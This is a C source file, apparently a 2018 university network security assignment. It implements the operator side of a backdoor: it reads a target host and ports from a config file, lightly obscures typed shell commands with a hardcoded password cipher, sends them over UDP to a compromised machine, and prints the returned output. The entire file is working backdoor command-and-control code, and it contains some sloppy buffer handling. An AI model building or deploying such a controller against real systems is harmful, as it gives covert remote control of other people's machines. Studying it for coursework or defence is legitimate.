// Name:    Brandon Gillespie and Justen DePourcq
// Date:    October 19th, 2018
// Class:   COMP8505
// Assn:    Assignment 3 - Backdoor
// Purpose: This program acts as the server that sends commands to the backdoor.

// Include statements.
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <string.h>
#include <netdb.h>
#include <errno.h>

// Define statements.
#define OPTIONS "h:s:r:k:"
#define PASSLEN 8
#define PASSWORD "password"
#define MAXLEN 65000

void read_config(char *string, char *token) {
  char *tmp;
  strcpy(string, token);
  tmp = strstr(string, "\n");
  *tmp = '\0';
}

// Main
int main() {
    // Allocate variables.
    int sd, port, send_sd, server_len, rport, len;
    char sbuf[MAXLEN], rbuf[MAXLEN], ebuf[MAXLEN], fbuf[MAXLEN];
    char *keyString, *rportString, *sportString, *host, *type, *token;
    FILE *scfp;
    struct sockaddr_in server, client, junk;
    char command[MAXLEN], *ptr;
    struct hostent *hp;
    size_t junk_len;

    keyString = rportString = sportString = host = type = NULL;

    if ((scfp = fopen("server_config", "r")) == 0) {
      fprintf(stderr, "Server Configuration File.\n");
    }

    while (fgets(fbuf, MAXLEN, scfp)) {
      token = strtok(fbuf, ":");
      if (strcmp(token, "rport") == 0) {
        token = strtok(NULL, ":");
        rportString = malloc(sizeof(char) * (strlen(token) + 1));
        read_config(rportString, token);
      } else if (strcmp(token, "sport") == 0) {
        token = strtok(NULL, ":");
        sportString = malloc(sizeof(char) * (strlen(token) + 1));
        read_config(sportString, token);
      } else if (strcmp(token, "host") == 0) {
        token = strtok(NULL, ":");
        host = malloc(sizeof(char) * (strlen(token) + 1));
        read_config(host, token);
      } else if (strcmp(token, "type") == 0) {
        token = strtok(NULL, ":");
        type = malloc(sizeof(char) * (strlen(token) + 1));
        read_config(type, token);
      } else if (strcmp(token, "key") == 0) {
        token = strtok(NULL, ":");
        keyString = malloc(sizeof(char) * (strlen(token) + 1));
        read_config(keyString, token);
      }
    }

    // Check command line arguments to see if they are null. If they are
    // we need to give a default value before parsing the value.
    if (sportString == NULL) {
      printf("Default sPort being used: 9000\n");
      sportString = "9000";
    }
    port = strtoul(sportString, NULL, 0);
      if (errno == EINVAL || errno == ERANGE) {
        perror("strtoul");
        return EXIT_FAILURE;
    }

    if (rportString == NULL) {
      printf("Default rPort being used: 9001\n");
      rportString = "9001";
    }
    rport = strtoul(rportString, NULL, 0);
      if (errno == EINVAL || errno == ERANGE) {
        perror("strtoul");
        return EXIT_FAILURE;
    }

    if (host == NULL) {
      printf("Default host being used: 192.168.0.10\n");
      host = "192.168.0.10";
    }

    if (keyString == NULL) {
      printf("Default key being used: foobar\n");
      keyString = "foobar";
    }

    printf("Port to Receive: %s\n", rportString);
    printf("Port to Send: %s\n", sportString);
    printf("Host to send to: %s\n", host);
    printf("Type to send by: %s\n", type);
    printf("Key to validate: %s\n", keyString);
    printf("\n");

    // Setup receive socket.
    if ((sd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
        perror("Can't create socket \n");
        exit(1);
    }

    // Setup send socket.
    if ((send_sd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
        perror("Can't create socket 2\n");
        exit(1);
    }

    // Setup server structure.
    bzero((char *)&server, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    if ((hp = gethostbyname(host)) == NULL) {
        perror("Hostname\n");
        exit(1);
    }
    bcopy(hp->h_addr, (char *)&server.sin_addr, hp->h_length);

    // Setup client structure.
    bzero((char *)&client, sizeof(client));
    client.sin_family = AF_INET;
    client.sin_port = htons(rport);
    client.sin_addr.s_addr = htonl(INADDR_ANY);
    if (bind(sd, (struct sockaddr *)&client, sizeof(client)) == -1) {
        perror("Could not bind \n");
        exit(1);
    }

    // Main loop that gets input, packages the command, sends, and receives.
    while (1) {
        // Clear buffers.
        memset(rbuf, 0, sizeof(rbuf));
        memset(sbuf, 0, sizeof(sbuf));
        memset(ebuf, 0, sizeof(ebuf));
        memset(command, 0, sizeof(command));

        // Get command.
        fgets(command, MAXLEN, stdin);

        ptr = strstr(command, "\n");
        *ptr = '\0';

        len = strlen(keyString) + strlen("start[") + strlen("]end") + strlen(command);

        // Add key.
        strcat(sbuf, keyString);
        // Put start string on encryption buffer.
        strcat(ebuf, "start[");
        // Put command string on encryption buffer.
        strcat(ebuf, command);
        // Put end string on encryption buffer.
        strcat(ebuf, "]end");

        printf("Encrypt Buffer: %s\n\n\n", ebuf);

        // Encrypt.
        int p_index = 0;
        for (int i = 0; i < len; i++) {
            //ebuf[i] = ebuf[i] - 5;
            int tmp = ebuf[i];
            tmp = (tmp - PASSWORD[p_index]) * -1;
            ebuf[i] = tmp;
            ++p_index;
            if (p_index == (strlen(PASSWORD) - 1)) { p_index = 0; }
        }
        printf("Encrypted Buffer: %s\n\n\n", ebuf);
        // Add encrypted payload onto real payload.
        strcat(sbuf, ebuf);

        printf("Sending command\n");
        // Send command.
        junk_len = 0;
        server_len = sizeof(server);
      	if (sendto(sd, sbuf, len, 0, (struct sockaddr *)&server, server_len) == -1) {
      		perror("sendto failure");
      		exit(1);
      	}

        printf("Receiving response\n");
        // Receive response.
        if (recvfrom(sd, rbuf, MAXLEN, 0, (struct sockaddr *)&junk, &junk_len) < 0) {
            perror("Receive failed \n");
            exit(1);
        }

        // Print reponse.
        printf("From Host: \n%s\n", rbuf);
    }
}
